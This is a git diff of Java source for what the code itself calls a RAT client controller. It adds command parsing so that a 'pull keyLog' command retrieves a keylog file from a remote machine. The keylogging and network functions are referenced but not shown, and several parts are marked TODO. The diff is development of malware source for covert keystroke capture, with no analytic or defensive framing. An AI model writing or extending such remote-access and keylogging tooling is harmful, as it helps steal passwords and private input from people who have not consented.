@@ -14,7 +14,7 @@ public class Client {
     private InetAddress Server_IP; //TODO fix cannot use Inet4Address (get compulation error from Client() constructor
     private InetAddress RAT_IP;
     private boolean isActive;
-    private File lastRecievedFile;
+    private File lastRecievedFile, keyLogFile;
     private final int DEFAULT_RAT_PORT = 0; //TODO decide on default port for rat client
 
     private Client() throws UnknownHostException {
@@ -35,8 +35,55 @@ public class Client {
     /*
     sends command to RAT over a socket
      */
-    public void parseCommand(String[] args){
+    public void parseCommand(String[] command){
 
+        //make sure arguments provided for "client" command
+        try{
+            String[] nextPart = breakOffFirstPart(command);
+            switch (command[0]){
+                case "pull":
+                    parsePull(nextPart);
+                    break;
+                case "test":
+                    //TODO implement this
+                    break;
+                default :
+                    System.out.println("ERR: \"" + command[0] + "\" not recognized as a valid client command");
+                    break;
+            }
+        } catch (NegativeArraySizeException n){
+            System.out.println("ERR: no arguments provided for command: " + clientName);
+            return;
+        }
+
+    }
+
+    private void parsePull(String[] command){
+
+        //make sure arguments provided for "client pull" command
+        try{
+            String[] nextPart = breakOffFirstPart(command);
+            switch (command[0]){
+                case "keyLog":
+                    this.keyLogFile = this.pullKeylog();
+                    System.out.println("Keylog file pulled, stored in Client1.keyLogFile");
+                    break;
+                default :
+                    System.out.println("ERR: \"" + command[0] + "\" not recognized as a valid pull argument");
+                    break;
+            }
+        } catch (NegativeArraySizeException n){
+            System.out.println("ERR: no arguments provided for command: pull");
+            return;
+        }
+
+    }
+
+    private static String[] breakOffFirstPart(String[] args){
+        //create new array from everything but the first word in the command
+        String[] nextPart = new String[args.length -1];
+        System.arraycopy(args, 1, nextPart, 0, args.length -1);
+        return nextPart;
     }
 
     /*
